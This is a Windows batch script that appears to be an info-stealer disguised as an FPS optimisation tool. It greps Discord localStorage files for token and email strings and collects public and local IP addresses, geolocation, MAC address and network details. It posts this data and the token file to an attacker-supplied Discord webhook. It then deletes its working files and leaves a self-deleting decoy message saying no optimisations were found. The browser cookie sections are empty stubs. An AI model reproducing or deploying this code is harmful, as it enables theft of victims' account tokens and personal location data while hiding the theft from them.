@echo off
:: MADE BY KYOGRQ
:: INPUT WEBHOOK URL ON LINE 108
:: Use responsibly guys.

NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' goto :gotAdmin

echo Please rerun this script with admin privileges.
pause
exit /B

:gotAdmin

set "my_os=%OS%"
set "my_os_extra=%OS%"

set "local_tzname=%TZ%"

set "discord_dir=%USERPROFILE%\AppData\Local\Discord"

if exist "%discord_dir%" (
    set "discord_installed=true"
) else (
    set "discord_installed=false"
)

if "%discord_installed%"=="true" (
    rem Code to check and extract user info from Discord files
    for /f "delims=" %%I in ('dir "%discord_dir%\*.*" /s /b ^| findstr /i "localStorage"') do (
        findstr /C:"token" "%%I" >> userinfo.txt
        findstr /C:"email" "%%I" >> userinfo.txt
    )
)

set "get_ip="
for /f "delims=" %%I in ('powershell -Command "(Invoke-RestMethod -Uri 'https://api.ipify.org').Content"') do set "get_ip=%%I"
set "get_ipv6="
for /f "delims=" %%I in ('powershell -Command "(Invoke-RestMethod -Uri 'https://api64.ipify.org').Content"') do set "get_ipv6=%%I"
powershell -Command "$ip = Invoke-RestMethod -Uri 'http://ip-api.com/json/%get_ip%?fields=continent,country,region,regionName,city,district,zip,lat,lon,isp,reverse,proxy'; $ip | ConvertTo-Json" > ip_json.json

for /f "usebackq delims={} tokens=2" %%A in ("ip_json.json") do (
    for /f "tokens=1,* delims=:" %%B in ("%%A") do (
        set "%%B=%%C"
    )
)

set "latstring=%lat%"
set "longstring=%lon%"
set "ip_coords=%latstring% %longstring%"
set "service_provider=%isp%"

if "%proxy%"=="true" (
    set "using_vpn=Yes"
) else (
    set "using_vpn=No"
)

if "%zip%"=="" (
    set "zip_code=Not Detected"
) else (
    set "zip_code=%zip%"
)

if "%district%"=="" (
    set "district=Not Detected"
) else (
    set "district=%district%"
)

set "hostname=%COMPUTERNAME%"
for /f "tokens=2 delims=:" %%I in ('ipconfig ^| findstr /i "IPv4 Address"') do set "IPAddr=%%I"

arp -a > arp_output.txt
ipconfig > ipconfig_output.txt

for /f "tokens=2 delims=:" %%I in ('getmac /v /fo list ^| find "Physical Address"') do set "mac_address=%%I"

:: Capture screenshot

set /p screenshot_base64=<screenshot_base64.txt

rem Check Chrome
if exist "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cookies" (
    rem Code to extract and process Chrome cookies
)

rem Check Brave
if exist "%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies" (
    rem Code to extract and process Brave cookies
)

rem Check Opera
if exist "%USERPROFILE%\AppData\Roaming\Opera Software\Opera Stable\Cookies" (
    rem Code to extract and process Opera cookies
)

rem Check Edge
if exist "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" (
    rem Code to extract and process Edge cookies
)

set "webhook_url=YOUR_DISCORD_WEBHOOK_URL"
echo {\"embeds\":[{\"title\":\"System Information\",\"fields\":[{\"name\":\"Operating System\",\"value\":\"%my_os% - %my_os_extra%\"},{\"name\":\"Timezone\",\"value\":\"%local_tzname%\"}]},{\"title\":\"IP Information\",\"fields\":[{\"name\":\"Public IPv4 Address\",\"value\":\"%get_ip%\"},{\"name\":\"Public IPv6 Address\",\"value\":\"%get_ipv6%\"},{\"name\":\"Service Provider\",\"value\":\"%service_provider%\"},{\"name\":\"Using VPN\",\"value\":\"%using_vpn%\"}]},{\"title\":\"Local Network Information\",\"fields\":[{\"name\":\"Local IP Address\",\"value\":\"%IPAddr%\"},{\"name\":\"Local MAC Address\",\"value\":\"%mac_address%\"}]},{\"title\":\"Geolocation Information\",\"fields\":[{\"name\":\"City\",\"value\":\"%city%, %region%, %country%\"},{\"name\":\"District\",\"value\":\"%district%\"},{\"name\":\"ZIP Code\",\"value\":\"%zip_code%\"},{\"name\":\"Lat/Long\",\"value\":\"%ip_coords%\"}]},{\"title\":\"Screenshot\",\"image\":{\"url\":\"data:image/png;base64,%screenshot_base64%\"}},{\"title\":\"Discord User Information\",\"description\":\"See attached file for user info.\",\"color\":16711680}]} > content.json

powershell -Command "(Invoke-RestMethod -Method Post -Uri '%webhook_url%' -Body (Get-Content content.json -Raw) -ContentType 'application/json')"

rem Send user info file to webhook
powershell -Command "(Invoke-RestMethod -Method Post -Uri '%webhook_url%' -InFile userinfo.txt)"

rem Clean up
del /f /q arp_output.txt
del /f /q ipconfig_output.txt
del /f /q ip_json.json
del /f /q content.json
del /f /q screenshot.png
del /f /q screenshot_base64.txt
del /f /q userinfo.txt

echo @echo off > optimisations.bat
echo echo No possible FPS Optimisations found. >> optimisations.bat
echo del /f /q optimisations.bat >> optimisations.bat
echo del /f /q "%~f0" >> optimisations.bat

exit